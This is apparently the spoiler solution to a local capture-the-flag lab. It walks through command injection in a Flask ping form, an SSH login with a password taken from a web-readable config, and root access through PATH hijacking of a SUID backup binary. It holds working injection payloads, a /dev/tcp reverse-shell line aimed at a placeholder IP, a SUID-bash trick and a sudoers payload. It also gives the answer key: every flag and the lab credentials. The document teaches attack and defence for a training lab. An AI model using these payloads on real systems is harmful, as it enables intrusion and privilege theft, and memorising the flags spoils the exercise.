# 🔨 Forge — SOLUTION (spoilers)

> Full walkthrough. Don't read unless you're really stuck or reviewing.

3-hop boot2root: **web OS command-injection → RCE as www-data → lateral to
`deploy` via web-readable creds → SUID + PATH-hijack → root.** Three flags, two
distinct escalations.

Target: `localhost`, web on **8084**, SSH on **2224**.

---

## Stage 0 — Recon

```bash
nmap -sV -p- localhost
# or: nmap -sV -p 2224,8084 localhost
```

- `2224/tcp` — OpenSSH
- `8084/tcp` — HTTP, Werkzeug/Flask — "Forge build console" with a **connectivity
  check** form (POSTs `host` to `/diagnostics`).

---

## Stage 1 — OS command injection → Flag 1 (RCE as www-data)

The diagnostic runs `ping -c 1 <host>` with the host interpolated into a shell.
Prove injection:

```bash
curl -s -X POST http://localhost:8084/diagnostics --data-urlencode 'host=127.0.0.1; id'
# ... ping output ... then:
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Injection works (`;` ends `ping`, starts your command). You are **www-data**.
Grab flag 1 and read the app dir:

```bash
curl -s -X POST http://localhost:8084/diagnostics --data-urlencode 'host=x; cat /var/www/forge/flag1.txt'
# FLAG{rc3_c0mm4nd_1nj3ct10n}
```

- **Flag 1:** `FLAG{rc3_c0mm4nd_1nj3ct10n}`

Other payload shapes that work: `host=|id`, `host=$(id)`, `host=`;`nc ...` for a
reverse shell (`; bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'`) if you want a
proper interactive shell instead of one-shot curls.

Lesson: any user input that reaches a shell is RCE. The fix is to never build
shell strings from input — pass argv lists (`subprocess.run(["ping","-c","1",host])`)
and validate the host.

---

## Stage 2 — Lateral movement → Flag 2 (user.txt)

www-data is a service account with no home worth anything. Enumerate the app's own
files — the config is the prize:

```bash
curl -s -X POST http://localhost:8084/diagnostics --data-urlencode 'host=x; cat /var/www/forge/config.py'
# DEPLOY_USER = "deploy"
# DEPLOY_PASSWORD = "F0rge-D3pl0y-2026!"
```

The web app stored a **real user's** password in a web-readable config. Use it on
SSH (interactive, unlike the one-shot curl RCE):

```bash
ssh deploy@localhost -p 2224
# password: F0rge-D3pl0y-2026!
cat ~/user.txt
```

- **Flag 2:** `FLAG{lat3ral_www_t0_us3r}`

(`/home/deploy` is mode 0750, so www-data could not read `user.txt` directly — the
lateral move is mandatory.)

---

## Stage 3 — Priv-esc: SUID + PATH hijack → Flag 3 (root.txt)

`sudo -l` is a dead end for deploy. Hunt SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
# ... /usr/local/bin/forge-backup   <-- custom, non-standard
```

`forge-backup` is SUID-root and runnable by the `deploy` group. What does it do?

```bash
strings /usr/local/bin/forge-backup | grep -i tar
# tar -czf /var/backups/forge.tar.gz -C /var/www forge
```

It calls **`tar` by name, not `/usr/bin/tar`** — and runs as root. So whatever
`tar` resolves to *first* in `$PATH` runs as root. **Hijack it:**

```bash
cd /tmp
cat > tar <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
EOF
chmod +x tar
export PATH=/tmp:$PATH      # our fake tar is now found first
/usr/local/bin/forge-backup # runs our 'tar' as root
/tmp/rootbash -p            # SUID bash -> euid=0
id                          # uid=1001(deploy) euid=0(root)
cat /root/root.txt
```

- **Flag 3:** `FLAG{r00t_suid_path_hij4ck}`

Why it works: the binary does `setuid(0)` then `system("tar ...")`. `system()`
runs `/bin/sh -c`, which inherits our poisoned `$PATH`, finds `/tmp/tar` before
`/usr/bin/tar`, and executes it as root. `chmod 4755` on a bash copy gives us a
reusable SUID-root shell; `-p` stops bash from dropping the elevated euid.

Alternate payloads inside the fake `tar`: add deploy to sudoers
(`echo 'deploy ALL=(ALL) NOPASSWD:ALL' >/etc/sudoers.d/x`), spawn a reverse shell,
or `cat /root/root.txt >/tmp/loot && chmod 644 /tmp/loot`.

---

## Fixes (the blue-team half)

- **Never build shell commands from user input.** Use argv arrays, not
  `shell=True` string interpolation; validate/allow-list the host.
- **Don't store real-user secrets in web-readable files.** A web RCE should not
  hand the attacker a login. Use a secrets manager; scope file perms tightly.
- **SUID is a loaded gun.** Avoid custom SUID binaries; if you must, call helpers
  by **absolute path**, sanitize the environment (`PATH`, `IFS`), and drop privs
  ASAP. Audit with `find / -perm -4000`.

## Flag summary

| # | Stage | Flag |
|---|-------|------|
| 1 | RCE via command injection (www-data) | `FLAG{rc3_c0mm4nd_1nj3ct10n}` |
| 2 | Lateral movement (user.txt) | `FLAG{lat3ral_www_t0_us3r}` |
| 3 | Priv-esc: SUID PATH-hijack (root.txt) | `FLAG{r00t_suid_path_hij4ck}` |
